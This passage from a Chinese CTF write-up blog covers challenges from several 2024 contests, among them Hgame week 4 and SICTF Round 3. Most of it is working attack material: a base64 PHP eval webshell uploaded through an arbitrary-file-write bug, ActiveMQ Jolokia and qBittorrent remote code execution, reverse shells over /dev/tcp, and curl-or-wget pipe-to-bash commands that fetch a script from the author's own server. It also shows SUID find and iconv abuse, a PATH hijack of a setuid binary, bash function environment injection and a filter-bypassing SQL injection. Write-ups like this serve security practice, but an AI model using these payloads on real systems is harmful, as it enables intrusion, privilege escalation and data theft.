,$b是一个全局变量，再看回上面的源码。$b是用户输入的password，那就直接打payload就可</p><p><img src="/img/%E9%9D%92%E5%B0%91%E5%B9%B4CTF2024/4.jpg" alt="图片.jpg"></p><h1 id="新翔OA管理系统"><a href="#新翔OA管理系统" class="headerlink" title="新翔OA管理系统"></a>新翔OA管理系统</h1><p>可以找到<a href="http://www.zip,审计源码发现,前台任意文件写入,/">www.zip,审计源码发现，前台任意文件写入，</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Description: PhpStorm.</span><br><span class="hljs-comment"> * Author: yoby</span><br><span class="hljs-comment"> * DateTime: 2018/12/4 18:01</span><br><span class="hljs-comment"> * Email:logove<span class="hljs-doctag">@qq</span>.com</span><br><span class="hljs-comment"> * Copyright Yoby版权所有</span><br><span class="hljs-comment"> */</span><br>  <span class="hljs-variable">$img</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;imgbase64&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, <span class="hljs-variable">$img</span>, <span class="hljs-variable">$result</span>)) &#123;<br>  <span class="hljs-variable">$type</span> = <span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>  <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d&quot;</span>) . <span class="hljs-string">&quot;-&quot;</span> . <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$type</span>;<br>&#125;<br><span class="hljs-variable">$img</span> =  <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$img</span>));<br>@<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$img</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;src&quot;:&quot;&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>在&#x2F;uploadbase64.php 中 POST传入imgbase64 并未限制后缀 先base64解码 然后 file_put_contents 写文件</p><p>post传入：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">imgbase64</span>=data:image/php<span class="hljs-comment">;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7</span><br></code></pre></td></tr></table></figure><p>然后得到文件地址，进入该地址，即可执行命令。</p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame 2024 week 4</title>
    <link href="/2024/02/20/Hgame-2024-week-4/"/>
    <url>/2024/02/20/Hgame-2024-week-4/</url>
    
    <content type="html"><![CDATA[<p>by:Infernity</p><h1 id="Reverse-and-Escalation"><a href="#Reverse-and-Escalation" class="headerlink" title="Reverse and Escalation."></a><strong>Reverse and Escalation.</strong></h1><p><strong>一个find提权闹麻了</strong></p><p>这道题是ActiveMQ Jolokia 后台代码执行漏洞</p><p><a href="https://blog.csdn.net/huangyongkang666/article/details/134814554">https://blog.csdn.net/huangyongkang666/article/details/134814554</a></p><p>去github上下载一个poc</p><p><img src="/img/Hgame_2024/23.png" alt="图片.png"></p><p>然后打入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 poc.py -u admin -p admin http://47.102.184.100:31838/<br></code></pre></td></tr></table></figure><p>等待处理完毕后进入&#x2F;admin&#x2F;shell.jsp?cmd&#x3D;</p><p>然后就可以执行命令了，查看flag发现没权限，用suid提权试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; ;<br></code></pre></td></tr></table></figure><p>这里用第三条才行，其他两条不行。</p><p>执行发现find有root权限，那直接用find执行命令。.</p><p><img src="/img/Hgame_2024/24.png" alt="图片.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /flag -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag ;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame_2024/25.png" alt="图片.png"></p><p><strong>hgame{961c3bf5c7a186ed8e39174ccf248b1aee228479}</strong></p><h1 id="Reverse-and-Escalation-II"><a href="#Reverse-and-Escalation-II" class="headerlink" title="Reverse and Escalation II."></a><strong>Reverse and Escalation II.</strong></h1><p><strong>我得坐起来跟他打.gif</strong>                                                 <strong>感谢M1sery</strong></p><p>承接上一道题，这道题的find命令没法正常使用，所以不能用find执行命令的方式读出flag。在得到&#x2F;admin&#x2F;shell.jsp?cmd&#x3D;后，发现使用find命令会让我们回答一个计算题，但是时间只在瞬息之间，手打不可能，必须用脚本。</p><p>这里第一步需要先反弹shell，才好操作。</p><p><a href="https://www.cnblogs.com/BOHB-yunying/p/15523680.html">https://www.cnblogs.com/BOHB-yunying/p/15523680.html</a></p><p>普通的反弹shell语句都不可以，这篇文章提到了java中利用Runtime.getRuntime().exec来反弹shell，这里前面语句可能就是这个，所以尝试把这个语句传参打入:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;<span class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>测试后发现不行，那就把这段语句保存为一个文件，例如shell</p><p>然后把这个shell文件上传到自己的服务器(位置是&#x2F;var&#x2F;www&#x2F;html&#x2F;)，再通过题目服务器自带的wget命令下载到题目服务器的网站根目录上，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://47.xxx.xxx.xx/shell<br></code></pre></td></tr></table></figure><p>这样还是不能执行shell文件，因为你ls -al发现shell的权限不够，那我们就需要给它升级权限，利用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 ./shell<br></code></pre></td></tr></table></figure><p>这里就得到了一个可执行的shell，然后我们回到&#x2F;admin&#x2F;shell.jsp页面，在服务器上开启监听，执行shell文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/admin/shell.jsp?cmd=./shell<br></code></pre></td></tr></table></figure><p>到这里反弹shell成功。</p><p>最开始我写了个bash脚本回答它给的问题，但是每次都是错误的，那可能find的内部逻辑不正确，我们把&#x2F;user&#x2F;bin&#x2F;find这个程序下载到本地，拖到ida里逆出来拿到它的内部代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// eax</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>    <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>    <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>    v3 = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);  <span class="hljs-comment">//返回当前时间</span><br>    <span class="hljs-built_in">srand</span>(v3);  <span class="hljs-comment">//设置随机数种子</span><br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt; argc; ++i )<br>    &#123;<br>        v7 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">23333</span>;<br>        v6 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">23333</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d + %d = \n&quot;</span>, v7, v6);<br>        <span class="hljs-keyword">if</span> ( v7 + v6 != <span class="hljs-built_in">atoi</span>(argv[i]) )<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wrong answer!&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        v4 = <span class="hljs-built_in">atoi</span>(argv[i]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d correct!\n&quot;</span>, v4);<br>        <span class="hljs-keyword">if</span> ( ++v9 &gt; <span class="hljs-number">38</span> )<br>        &#123;<br>            <span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);    <span class="hljs-comment">//权限升级</span><br>            <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>审计代码才发现，这里就是在我们执行find的时候，要回答随机数组成的39个问题，然后就会以root的权限执行system(“ls”);</p><p>而这里是以时间为种子的随机数，是伪随机数，我们可以自己写个脚本，把时间提前一点，得到的序列把39个答案卡好时间传给find就可以了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v7;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> v9;<br><br>    v3 = time(<span class="hljs-number">0LL</span>);<br>    srand(v3 + <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;v3: %d\n&quot;</span>, v3);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;/usr/bin/find &quot;</span>);<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; ++i)<br>    &#123;<br>        v7 = rand() % <span class="hljs-number">23333</span>;<br>        v6 = rand() % <span class="hljs-number">23333</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, v7 + v6);<br>        <span class="hljs-keyword">if</span> (++v9 &gt; <span class="hljs-number">38</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里是提前了10s，会生成39个答案</p><p><img src="/img/Hgame_2024/26.png" alt="图片.png"></p><p>我们就把这一段，直接复制到我们反弹shell的终端里，卡好10s时间，多打几次，就能成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/find 36230 11291 17094 25946 11960 9219 19755 17043 13268 25972 20122 25497 25726 11857 7919 28246 3433 4614 10100 9660 3632 20753 19857 14603 25764 7183 5291 15056 18010 11073 22600 16287 21642 17812 31136 19806 7802 23533 9086<br></code></pre></td></tr></table></figure><p>但是刚刚说了，这里39次成功后，系统执行的是ls命令，我们如何修改这个部分拿到flag呢。</p><p>这里就需要我们写一个名为ls的可执行文件，把它放到&#x2F;tmp目录里，然后把&#x2F;tmp目录，放在$PATH环境变量的最前面，这样系统执行system(“ls”)的时候，就会在环境变量的第一个也就是&#x2F;tmp目录里去找我们写的ls可执行程序，来读取flag。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">char</span> c;<br><br>    fp = fopen(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">while</span> ((c = fgetc(fp)) != EOF)<br>    &#123;<br>        <span class="hljs-built_in">putchar</span>(c);<br>    &#125;<br>    fclose(fp);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个是ls源码，我们把它静态编译成可执行程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -static -o <span class="hljs-built_in">ls</span> ls.c<br></code></pre></td></tr></table></figure><p>这样就会在我们的linux上创建一个名为ls的可执行程序。我们把它上传到我们的服务器上，在利用wget下载到题目服务器的&#x2F;tmp目录里。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -P /tmp http://47.xxx.xxx.xx/ls<br></code></pre></td></tr></table></figure><p>然后把&#x2F;tmp目录，放在$PATH环境变量的最前面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>一切准备就绪，执行我们的find，拿到密码序列，然后卡时间打入find。</p><p><img src="/img/Hgame_2024/27.png" alt="图片.png"></p><p>时间不好卡，算好提前量多发几次。</p><p><img src="/img/Hgame_2024/28.png" alt="图片.png"></p><p>成功后拿到flag。</p><p><strong>hgame{f288b31a0ca16ed51e49021c7be9ee7b614162b2}</strong></p><h1 id="Whose-Home"><a href="#Whose-Home" class="headerlink" title="Whose Home?"></a>Whose Home?</h1><p><img src="/img/Hgame_2024/29.png" alt="图片.png"></p><p>打开是qb的web ui 登录页面，这种一般是有默认账号和密码的，我们去网上搜搜。账户admin，密码adminadmin</p><p>登录进来后，我们了解到版本是4.5.5我们去网上搜搜关于这个版本的漏洞。</p><p><a href="https://github.com/qbittorrent/qBittorrent/issues/18731">https://github.com/qbittorrent/qBittorrent/issues/18731</a></p><p>qb的后台可以rce。</p><p><img src="/img/Hgame_2024/30.png" alt="图片.png"></p><p>在额外设置这里可以添加我们的rce代码。</p><p><img src="/img/Hgame_2024/31.png" alt="图片.png"></p><p>尝试直接反弹shell不行后，我们就直接拿文章中的payload。</p><p>先把反弹shell的命令放到我们的服务器上，我保存为1.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/47.xxx.xx.xxx/2333 0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure><p>然后把payload输入进去。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&quot;(curl -s -L http://47.xxx.xx.xxx/1.sh || wget -O - http://47.xxx.xx.xxx/1.sh) | bash -s&quot;</span><br></code></pre></td></tr></table></figure><p>在我们的服务器上开启监听，然后随便添加个种子链接下载，比如这个magnet:?xt&#x3D;urn:btih:99986864CEF6A163775C8E9DBB662A93B05B9948</p><p>拿到了shell。</p><p><img src="/img/Hgame_2024/32.png" alt="图片.png"></p><p>但是我们发现flag没有权限去读</p><p><img src="/img/Hgame_2024/33.png" alt="图片.png"></p><p>看看有什么suid提权。从中可以看到iconv存在suid权限</p><p><img src="/img/Hgame_2024/34.png" alt="图片.png"></p><p>iconv如果存在suid权限，可以导致读取任意文件。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">LFILE</span>=/flag &amp;&amp; iconv -f ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span> -t UTF-<span class="hljs-number">8</span> <span class="hljs-string">&quot;$LFILE&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/Hgame_2024/35.png" alt="图片.png"></p><p><strong>hgame{a81ebbed09bcfa55d3b87079c5731d43a80cfed9}</strong></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SICTF Round#3</title>
    <link href="/2024/02/17/SICTF-Round3/"/>
    <url>/2024/02/17/SICTF-Round3/</url>
    
    <content type="html"><![CDATA[<p>by:Infernity</p><h1 id="100％-upload"><a href="#100％-upload" class="headerlink" title="100％_upload"></a>100％_upload</h1><p>可真气死我了这道题，没注意看url，跟着标题走，一直在文件上传，一直在绕过滤，他要过滤也不过滤全，留个.user.ini没过滤，就一直围绕这个想办法，结果……</p><p><img src="/img/SICTF2024/1.png" alt="图片.png"></p><p>打开题目，很明显的提示，index.php里有Include函数，那么我们直接上传一个jpg马，然后包含他就出来了。</p><p><img src="/img/SICTF2024/2.png" alt="图片.png"></p><p><strong>SICTF{ea391e30-b67e-4a5d-97ca-7c00f1bc107b}</strong> </p><h1 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h1><p>新知识点，利用环境变量注入。</p><p><a href="https://www.cnblogs.com/h0cksr/p/16189733.html">https://www.cnblogs.com/h0cksr/p/16189733.html</a></p><p>前面的反序列化这里不再赘述。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$welcome</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$you</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$year</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CR</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$last</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$newyear</span>=<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    worries&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ET</span></span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">start</span>();<br><span class="hljs-variable">$a</span>-&gt;welcome=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SE</span>();<br><span class="hljs-variable">$a</span>-&gt;welcome-&gt;year=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CR</span>();<br><span class="hljs-variable">$a</span>-&gt;welcome-&gt;year-&gt;last=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ET</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>&#x2F;^.<em>(worries).</em>$&#x2F;</p><p>这个可以在前面加个空格绕过。</p><p>主要是这一段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$inject</span> =&gt; <span class="hljs-variable">$rce</span>)&#123;<br>            <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$inject&#125;</span>=<span class="hljs-subst">&#123;$rce&#125;</span>&quot;</span>);<br>        &#125; <br></code></pre></td></tr></table></figure><p>这里环境变量注入要看看上面的文章，有点复杂。</p><p>这里直接get[BASH_FUNC_echo%%]&#x3D;() { cat &#x2F;f*; }</p><p>即可拿到flag。</p><h1 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h1><p>这道题考查sql无列名注入。</p><p><a href="https://blog.csdn.net/m0_46230316/article/details/106668182">https://blog.csdn.net/m0_46230316/article/details/106668182</a></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-symbol">`2`</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag)<span class="hljs-comment">/**/</span><span class="hljs-keyword">as</span><span class="hljs-comment">/**/</span>a%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>过滤了空格，经过测试，一共有两列，而flag肯定在第二列，所以是<code>2</code></p><p><strong>SICTF{4fa6acc5-9d2c-4af8-908c-53b66839b019}</strong></p><h1 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h1><p>他说有另一个文件，直接开扫！找到一个admin.php，进去看看</p><p><img src="/img/SICTF2024/3.png" alt="图片.png"></p><p>意思是我们需要把ip改成127.0.0.1</p><p>这里正好原文里给了curl</p><p><img src="/img/SICTF2024/4.png" alt="图片.png"></p><p>那直接以127.0.0.1开头进去就拿到flag了。</p><p>O:6:”client”:1:{s:3:”url”;s:26:”<a href="http://127.0.0.1/admin.php%22;%7D">http://127.0.0.1/admin.php&quot;;}</a></p><p>最后base64解密</p><p><img src="/img/SICTF2024/5.png" alt="图片.png"></p><p><strong>SICTF{af8d34d5-22c4-414d-a78e-b65f587712f5}</strong></p><h1 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP"></a>Oyst3rPHP</h1><p>最讨厌藏东西的题了，开局先扫，扫出来一个<a href="http://www.zip这是网站备份文件,里面会有源码,在app/controller/%E9%87%8C%E6%89%BE%E5%88%B0%E6%BA%90%E7%A0%81%EF%BC%8C%E5%AE%A1%E8%AE%A1%E6%BA%90%E7%A0%81%EF%BC%8C%E7%AC%AC%E4%B8%80%E6%AD%A5">www.zip这是网站备份文件，里面会有源码，在app/controller/里找到源码，审计源码，第一步</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$right</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;left&#x27;</span>];<br><span class="hljs-variable">$left</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;right&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$right</span> !== <span class="hljs-variable">$left</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$right</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$left</span>))&#123;<br></code></pre></td></tr></table></figure><p>传?left&#x3D;240610708&amp;right&#x3D;QLTHNDT</p><p>第二步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?THINKPHP/is&#x27;</span>, <span class="hljs-variable">$key</span>))&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Oysters don&#x27;t want you to eat&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">&#x27;603THINKPHP&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;！！！Oysters don&#x27;t want you to 